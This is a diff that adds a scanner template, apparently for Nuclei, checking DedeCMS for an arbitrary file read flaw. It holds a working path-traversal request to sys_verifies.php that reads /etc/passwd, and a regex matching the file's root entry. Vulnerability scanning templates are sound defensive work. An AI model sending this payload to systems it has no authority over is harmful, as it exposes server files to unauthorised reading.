@@ -1,0 +1,22 @@
+id: dedecms-verifies-lfi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: DedeCMS--任意文件读取
+  reference:
+    - http://kpanda.wiki/#/../Vulnhub/D20-3DedeCMS--%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/dede/sys_verifies.php?action=view&filename=../../../../../etc/passwd"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+#需前台注册用户权限。
